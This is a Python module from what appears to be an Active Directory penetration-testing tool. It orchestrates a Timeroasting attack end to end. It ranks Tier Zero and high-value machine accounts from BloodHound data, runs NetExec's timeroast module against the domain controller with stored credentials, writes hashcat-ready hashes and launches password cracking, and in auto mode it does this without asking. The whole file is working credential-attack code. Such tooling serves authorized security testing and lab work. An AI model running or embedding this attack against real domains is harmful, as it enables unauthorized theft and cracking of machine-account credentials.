"""CLI orchestration for Timeroasting high-value machine-account candidates."""

from __future__ import annotations

from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from typing import Any, Protocol
import json
import os
import shlex
import time

from rich.prompt import Confirm
from rich.table import Table

from adscan_internal import (
    print_error,
    print_info,
    print_info_debug,
    print_operation_header,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.cli import cracking as cracking_cli
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.integrations.netexec.parsers import (
    ParsedTimeroastHash,
    parse_netexec_timeroast_hashes,
)
from adscan_internal.interaction import is_non_interactive
from adscan_internal.path_utils import get_adscan_home
from adscan_internal.principal_utils import normalize_machine_account
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    print_panel,
    print_panel_with_table,
)
from adscan_internal.services.privileged_group_classifier import sid_rid
from adscan_internal.workspaces import domain_relpath, domain_subpath
from adscan_internal.workspaces.computers import count_enabled_computer_accounts


_MONTH_SECONDS = 30 * 24 * 60 * 60
_MIN_MEANINGFUL_PASSWORD_CHANGE_GAP_SECONDS = 5 * 60
_DEFAULT_MAX_RESULTS = 250
_CANDIDATE_ARTIFACT = "timeroast_candidates.json"
_RAW_HASH_FILE = "hashes.timeroast.raw"
_NORMALIZED_HASH_FILE = "hashes.timeroast"
_LOG_FILE = "timeroast.log"


class TimeroastShell(Protocol):
    """Minimal shell surface used by the Timeroast CLI controller."""

    domains: list[str]
    domains_dir: str
    cracking_dir: str
    current_workspace_dir: str | None
    netexec_path: str | None
    auto: bool
    type: str | None
    scan_mode: str | None
    domains_data: dict[str, dict[str, Any]]

    def _get_workspace_cwd(self) -> str: ...

    def _get_bloodhound_service(self) -> Any: ...

    def _run_netexec(
        self,
        command: str,
        *,
        domain: str | None = None,
        timeout: int | None = None,
        pre_sync: bool = True,
        **kwargs: object,
    ) -> Any: ...

    def build_auth_nxc(
        self, username: str, password: str, domain: str, kerberos: bool = True
    ) -> str: ...

    def _get_lab_slug(self) -> str | None: ...

    def run_command(
        self,
        command: str,
        *,
        timeout: int | None = None,
        shell: bool = False,
        capture_output: bool = False,
        text: bool = False,
        use_clean_env: bool | None = None,
        **kwargs: object,
    ) -> Any:
        """Execute a blocking command."""

    def add_credential(
        self, domain: str, username: str, password: str, **kwargs: object
    ) -> None:
        """Persist a recovered credential."""

    def cracking(
        self,
        crack_type: str,
        domain: str,
        hash_path: str,
        failed: bool = False,
    ) -> None:
        """Retry a cracking workflow."""

    def ask_for_kerberoast_preauth(self, domain: str, user: str) -> None:
        """Offer a follow-up pre-auth Kerberoast attempt."""

    def _is_full_adscan_container_runtime(self) -> bool: ...

    def _sudo_validate(self) -> bool: ...

    def _is_ntp_service_available(self, host: str, timeout: int = 3) -> bool: ...

    def _is_tcp_port_open(self, host: str, port: int, timeout: int = 3) -> bool: ...

    def _sync_clock_via_net_time(
        self, host: str, *, domain: str | None = None
    ) -> bool: ...

    def do_sync_clock_with_pdc(self, domain: str, verbose: bool = False) -> bool: ...


@dataclass(frozen=True, slots=True)
class TimeroastCandidate:
    """High-value machine account candidate for Timeroasting."""

    samaccountname: str
    hostname: str
    fqdn: str
    rid: int
    pwdlastset: int
    whencreated: int
    days_since_password_change: float
    creation_change_gap_days: float | None
    reasons: tuple[str, ...]
    value_tier: str
    is_high_value: bool
    is_tier_zero: bool
    operating_system: str | None = None


def _classify_candidate_value(row: dict[str, Any]) -> tuple[str, bool, bool]:
    """Return the BloodHound-derived criticality tier for a computer node."""

    system_tags = row.get("system_tags") or row.get("systemTags") or []
    normalized_tags = {
        str(tag).strip().lower()
        for tag in system_tags
        if isinstance(tag, str) and str(tag).strip()
    }
    is_tier_zero = bool(row.get("isTierZero")) or "admin_tier_0" in normalized_tags
    is_high_value = is_tier_zero or bool(row.get("highvalue"))

    if is_tier_zero:
        return "Tier Zero", True, True
    if is_high_value:
        return "High Value", True, False
    return "Standard", False, False


def _coerce_epoch_seconds(value: object) -> int | None:
    """Return an integer epoch-seconds value when possible."""
    if value in (None, "", 0, "0"):
        return None
    try:
        parsed = int(float(str(value).strip()))
    except (TypeError, ValueError):
        return None
    if parsed <= 0:
        return None
    return parsed


def _format_epoch_utc(value: int | None) -> str:
    """Render an epoch-seconds timestamp as a compact UTC string."""
    if not value:
        return "-"
    try:
        return datetime.fromtimestamp(value, tz=timezone.utc).strftime(
            "%Y-%m-%d %H:%M UTC"
        )
    except Exception:
        return str(value)


def _build_timeroast_candidate(
    row: dict[str, Any],
    *,
    domain: str,
    current_epoch: int,
) -> TimeroastCandidate | None:
    """Normalize one BloodHound row into a Timeroast candidate."""
    if not isinstance(row, dict):
        return None

    pwdlastset = _coerce_epoch_seconds(row.get("pwdlastset"))
    whencreated = _coerce_epoch_seconds(row.get("whencreated"))
    if not pwdlastset or not whencreated:
        return None

    cond_manual_early_change = (
        pwdlastset != whencreated
        and pwdlastset > whencreated
        and (pwdlastset - whencreated)
        >= _MIN_MEANINGFUL_PASSWORD_CHANGE_GAP_SECONDS
        and (pwdlastset - whencreated) < _MONTH_SECONDS
    )
    has_post_creation_password_change = pwdlastset > whencreated
    cond_rotation_stale = (
        has_post_creation_password_change
        and (pwdlastset - whencreated)
        >= _MIN_MEANINGFUL_PASSWORD_CHANGE_GAP_SECONDS
        and (current_epoch - pwdlastset) > _MONTH_SECONDS
    )
    if not cond_manual_early_change and not cond_rotation_stale:
        return None

    object_id = str(row.get("objectid") or row.get("objectId") or "").strip()
    rid = sid_rid(object_id)
    if rid is None:
        return None

    raw_sam = (
        row.get("samaccountname")
        or row.get("samAccountName")
        or row.get("name")
        or row.get("dnshostname")
        or row.get("dNSHostName")
        or ""
    )
    samaccountname = normalize_machine_account(str(raw_sam or ""))
    if not samaccountname:
        return None

    hostname = samaccountname.rstrip("$")
    dns_host_name = str(row.get("dnshostname") or row.get("dNSHostName") or "").strip()
    name_value = str(row.get("name") or "").strip()
    if name_value and "@" in name_value:
        name_value = name_value.split("@", 1)[0].strip()
    fqdn = dns_host_name or name_value or f"{hostname}.{domain}"
    if "." not in fqdn:
        fqdn = f"{hostname}.{domain}"

    reasons: list[str] = []
    if cond_manual_early_change:
        reasons.append("Password changed shortly after account creation")
    if cond_rotation_stale:
        reasons.append("Password has not rotated in the last 30 days")
    value_tier, is_high_value, is_tier_zero = _classify_candidate_value(row)

    change_gap_days = None
    if pwdlastset > whencreated:
        change_gap_days = (pwdlastset - whencreated) / 86400.0

    return TimeroastCandidate(
        samaccountname=samaccountname,
        hostname=hostname,
        fqdn=fqdn,
        rid=rid,
        pwdlastset=pwdlastset,
        whencreated=whencreated,
        days_since_password_change=(current_epoch - pwdlastset) / 86400.0,
        creation_change_gap_days=change_gap_days,
        reasons=tuple(reasons),
        value_tier=value_tier,
        is_high_value=is_high_value,
        is_tier_zero=is_tier_zero,
        operating_system=str(row.get("operatingsystem") or "").strip() or None,
    )


def _get_timeroast_candidates(
    shell: TimeroastShell,
    domain: str,
) -> list[TimeroastCandidate]:
    """Query BloodHound and normalize Timeroast candidates."""
    try:
        service = shell._get_bloodhound_service()
        raw_rows = service.get_timeroast_candidates(
            domain,
            max_results=_DEFAULT_MAX_RESULTS,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            f"BloodHound Timeroast candidate query failed for {marked_domain}."
        )
        print_info_debug(
            f"[timeroast] candidate query failed for {marked_domain}: {exc}"
        )
        return []

    current_epoch = int(time.time())
    candidates: list[TimeroastCandidate] = []
    seen_rids: set[int] = set()
    for row in raw_rows or []:
        candidate = _build_timeroast_candidate(
            row if isinstance(row, dict) else {},
            domain=domain,
            current_epoch=current_epoch,
        )
        if candidate is None or candidate.rid in seen_rids:
            continue
        seen_rids.add(candidate.rid)
        candidates.append(candidate)

    candidates.sort(
        key=lambda item: (
            0 if item.is_tier_zero else 1 if item.is_high_value else 2,
            "Password has not rotated in the last 30 days" not in item.reasons,
            item.days_since_password_change * -1,
            item.fqdn.lower(),
        )
    )
    return candidates


def _should_skip_ctf_timeroast_due_to_single_computer(
    shell: TimeroastShell,
    domain: str,
) -> bool:
    """Return True when CTF Timeroast should be skipped due to a trivial computer set."""

    if str(getattr(shell, "type", "") or "").strip().lower() != "ctf":
        return False

    workspace_cwd = shell.current_workspace_dir or os.getcwd()
    marked_domain = mark_sensitive(domain, "domain")
    try:
        count = count_enabled_computer_accounts(workspace_cwd, shell.domains_dir, domain)
    except OSError as exc:
        print_info_debug(
            "[timeroast] enabled computer count unavailable for "
            f"{marked_domain}: {mark_sensitive(str(exc), 'detail')}"
        )
        return False

    print_info_debug(
        f"[timeroast] enabled computer count for {marked_domain}: {count}"
    )
    return count <= 1


def _write_timeroast_candidate_artifact(
    shell: TimeroastShell,
    domain: str,
    candidates: list[TimeroastCandidate],
) -> tuple[str, str] | None:
    """Persist Timeroast candidate metadata to the workspace."""
    workspace_cwd = shell._get_workspace_cwd()
    artifact_abs = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.cracking_dir,
        _CANDIDATE_ARTIFACT,
    )
    artifact_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.cracking_dir,
        _CANDIDATE_ARTIFACT,
    )
    os.makedirs(os.path.dirname(artifact_abs), exist_ok=True)

    payload = {
        "generated_at": datetime.now(timezone.utc).replace(microsecond=0).isoformat(),
        "domain": domain,
        "count": len(candidates),
        "candidates": [asdict(candidate) for candidate in candidates],
    }
    try:
        with open(artifact_abs, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, sort_keys=True)
            handle.write("\n")
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_warning("Failed to persist Timeroast candidate metadata.")
        return None
    return artifact_abs, artifact_rel


def _render_timeroast_candidates(
    domain: str,
    candidates: list[TimeroastCandidate],
    *,
    artifact_rel: str | None = None,
) -> None:
    """Render a high-signal Timeroast candidate summary."""
    marked_domain = mark_sensitive(domain, "domain")
    tier_zero_count = sum(1 for candidate in candidates if candidate.is_tier_zero)
    high_value_count = sum(
        1
        for candidate in candidates
        if candidate.is_high_value and not candidate.is_tier_zero
    )
    standard_count = max(0, len(candidates) - tier_zero_count - high_value_count)
    summary_lines = [
        "These machine accounts deviate from the default monthly computer-password rotation.",
        "Use the criticality column to separate Tier Zero and high-value systems from standard hosts.",
        "",
        f"Domain: {marked_domain}",
        f"Candidates: {len(candidates)}",
        f"Tier Zero: {tier_zero_count}",
        f"High Value: {high_value_count}",
        f"Standard: {standard_count}",
    ]
    if artifact_rel:
        summary_lines.append(f"Artifact: {mark_sensitive(artifact_rel, 'path')}")
    print_panel(
        "\n".join(summary_lines),
        title="[bold yellow]Prioritized Timeroast Candidates[/bold yellow]",
        border_style="yellow",
        expand=False,
    )

    table = Table(show_header=True, header_style="bold cyan")
    table.add_column("Computer", style="white")
    table.add_column("Value", style="red")
    table.add_column("RID", style="magenta", justify="right")
    table.add_column("Signals", style="yellow")
    table.add_column("PwdLastSet", style="cyan")
    table.add_column("Created", style="cyan")
    table.add_column("OS", style="green")

    for candidate in candidates[:15]:
        value_style = (
            "[bold red]Tier Zero[/bold red]"
            if candidate.is_tier_zero
            else "[bold yellow]High Value[/bold yellow]"
            if candidate.is_high_value
            else "[dim]Standard[/dim]"
        )
        table.add_row(
            mark_sensitive(candidate.fqdn, "hostname"),
            value_style,
            str(candidate.rid),
            "\n".join(candidate.reasons),
            _format_epoch_utc(candidate.pwdlastset),
            _format_epoch_utc(candidate.whencreated),
            candidate.operating_system or "-",
        )

    title = f"Timeroast Target Preview ({min(len(candidates), 15)} shown)"
    print_panel_with_table(
        table,
        title=title,
        border_style=BRAND_COLORS["warning"],
        expand=True,
    )


def _build_timeroast_paths(
    shell: TimeroastShell,
    domain: str,
) -> dict[str, str]:
    """Return absolute and relative Timeroast artifact paths."""
    workspace_cwd = shell._get_workspace_cwd()
    return {
        "raw_hash_abs": domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _RAW_HASH_FILE,
        ),
        "normalized_hash_abs": domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _NORMALIZED_HASH_FILE,
        ),
        "log_abs": domain_subpath(
            workspace_cwd,
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _LOG_FILE,
        ),
        "normalized_hash_rel": domain_relpath(
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _NORMALIZED_HASH_FILE,
        ),
        "log_rel": domain_relpath(
            shell.domains_dir,
            domain,
            shell.cracking_dir,
            _LOG_FILE,
        ),
    }


def _write_timeroast_hash_files(
    *,
    paths: dict[str, str],
    candidates_by_rid: dict[int, TimeroastCandidate],
    parsed_hashes: list[ParsedTimeroastHash],
) -> tuple[str | None, list[TimeroastCandidate]]:
    """Persist raw Timeroast output and filtered hashcat-ready hashes."""
    os.makedirs(os.path.dirname(paths["raw_hash_abs"]), exist_ok=True)
    matched_candidates: list[TimeroastCandidate] = []
    seen_candidate_rids: set[int] = set()

    try:
        with open(paths["raw_hash_abs"], "w", encoding="utf-8") as raw_handle:
            for parsed in parsed_hashes:
                raw_handle.write(f"{parsed.rid}:{parsed.hash_value}\n")
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_warning("Failed to persist raw Timeroast hashes.")

    normalized_lines: list[str] = []
    for parsed in parsed_hashes:
        candidate = candidates_by_rid.get(parsed.rid)
        if candidate is None:
            continue
        normalized_lines.append(f"{candidate.samaccountname}:{parsed.hash_value}")
        if candidate.rid not in seen_candidate_rids:
            seen_candidate_rids.add(candidate.rid)
            matched_candidates.append(candidate)

    if not normalized_lines:
        return None, []

    try:
        with open(paths["normalized_hash_abs"], "w", encoding="utf-8") as handle:
            handle.write("\n".join(normalized_lines) + "\n")
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_error("Failed to persist filtered Timeroast hashes.")
        return None, []

    return paths["normalized_hash_abs"], matched_candidates


def _collect_timeroast_hashes(
    shell: TimeroastShell,
    domain: str,
    candidates: list[TimeroastCandidate],
) -> str | None:
    """Run NetExec Timeroast and write hashcat-ready hashes for candidate RIDs."""
    if not shell.netexec_path:
        print_error(
            "NetExec is not installed or configured. Please run 'adscan install'."
        )
        return None

    pdc = str(shell.domains_data.get(domain, {}).get("pdc") or "").strip()
    if not pdc:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(f"PDC is not configured for {marked_domain}.")
        return None
    domain_creds = shell.domains_data.get(domain, {})
    username = str(domain_creds.get("username") or "").strip()
    password = str(domain_creds.get("password") or "").strip()
    if not username or not password:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Missing credentials for {marked_domain}. Timeroast requires authenticated SMB access."
        )
        return None

    pdc_target = pdc
    use_kerberos = False
    if hasattr(shell, "do_sync_clock_with_pdc"):
        try:
            use_kerberos = bool(shell.do_sync_clock_with_pdc(domain, verbose=True))
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_info_debug(
                f"[timeroast] kerberos clock sync precheck failed for "
                f"{mark_sensitive(domain, 'domain')}: {exc}"
            )
            use_kerberos = False
    pdc_hostname = str(domain_creds.get("pdc_hostname") or "").strip()
    if use_kerberos and pdc_hostname:
        pdc_target = f"{pdc_hostname}.{domain}"
    auth = shell.build_auth_nxc(username, password, domain, kerberos=use_kerberos)

    paths = _build_timeroast_paths(shell, domain)
    os.makedirs(os.path.dirname(paths["log_abs"]), exist_ok=True)

    print_operation_header(
        "Timeroasting",
        details={
            "Domain": domain,
            "Target": pdc,
            "Candidates": str(len(candidates)),
            "Log": paths["log_rel"],
        },
        icon="⏱️",
    )

    command = (
        f"{shlex.quote(shell.netexec_path)} smb {shlex.quote(pdc_target)} "
        f"{auth} -M timeroast --log {shlex.quote(paths['log_abs'])}"
    )
    print_info_debug(f"[timeroast] command: {command}")

    completed = shell._run_netexec(
        command,
        domain=domain,
        timeout=300,
        pre_sync=False,
    )
    if completed is None:
        print_error("Timeroast command failed to execute.")
        return None

    combined_output = (
        (getattr(completed, "stdout", "") or "")
        + "\n"
        + (getattr(completed, "stderr", "") or "")
    )
    parsed_hashes = parse_netexec_timeroast_hashes(combined_output)
    if not parsed_hashes:
        print_warning("NetExec Timeroast did not return any hashes.")
        return None

    candidates_by_rid = {candidate.rid: candidate for candidate in candidates}
    normalized_hash_file, matched_candidates = _write_timeroast_hash_files(
        paths=paths,
        candidates_by_rid=candidates_by_rid,
        parsed_hashes=parsed_hashes,
    )
    if not normalized_hash_file:
        print_warning(
            "NetExec returned Timeroast hashes, but none matched the selected "
            "BloodHound candidates."
        )
        return None

    print_success(
        "Collected Timeroast hashes for "
        f"{len(matched_candidates)} candidate machine account(s)."
    )
    print_info(
        "Filtered Timeroast hashes stored in "
        f"{mark_sensitive(paths['normalized_hash_rel'], 'path')}."
    )
    return normalized_hash_file


def run_timeroast_quick_win(shell: TimeroastShell, target_domain: str) -> bool:
    """Run the Phase 3 Timeroast quick win when BloodHound flags candidates."""
    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. "
            "Please add or select a valid domain."
        )
        return False

    if _should_skip_ctf_timeroast_due_to_single_computer(shell, target_domain):
        marked_domain = mark_sensitive(target_domain, "domain")
        print_info(
            f"Skipping Timeroast candidate checks in {marked_domain}: only one enabled computer account was found."
        )
        print_info_debug(
            "[timeroast] CTF quick win skipped because pre2k/timeroast heuristics "
            "do not add value with <= 1 enabled computer."
        )
        return False

    candidates = _get_timeroast_candidates(shell, target_domain)
    if not candidates:
        marked_domain = mark_sensitive(target_domain, "domain")
        print_info(
            f"No Timeroast candidates were identified in {marked_domain} by BloodHound."
        )
        return False

    artifact_info = _write_timeroast_candidate_artifact(
        shell, target_domain, candidates
    )
    artifact_rel = artifact_info[1] if artifact_info else None
    _render_timeroast_candidates(target_domain, candidates, artifact_rel=artifact_rel)

    should_execute = True
    if shell.auto or is_non_interactive(shell=shell):
        print_info("Auto mode detected. Proceeding with Timeroasting candidates.")
    else:
        should_execute = Confirm.ask(
            "Do you want to try Timeroasting these machine-account candidates now?",
            default=True,
        )
    if not should_execute:
        print_info("Timeroast quick win skipped by user.")
        return False

    normalized_hash_file = _collect_timeroast_hashes(shell, target_domain, candidates)
    if not normalized_hash_file:
        return False

    try:
        telemetry.capture(
            "timeroast_started",
            {
                "domain": target_domain,
                "candidate_count": len(candidates),
                "scan_mode": getattr(shell, "scan_mode", None),
                "workspace_type": getattr(shell, "type", None),
                **build_lab_event_fields(shell=shell, include_slug=True),
            },
        )
    except Exception as exc:  # pragma: no cover - telemetry best effort
        telemetry.capture_exception(exc)

    cracking_cli.run_cracking(
        shell,
        hash_type="timeroast",
        domain=target_domain,
        hash_file=normalized_hash_file,
        wordlists_dir=str(get_adscan_home() / "wordlists"),
        failed=False,
    )
    return True


__all__ = ["run_timeroast_quick_win"]
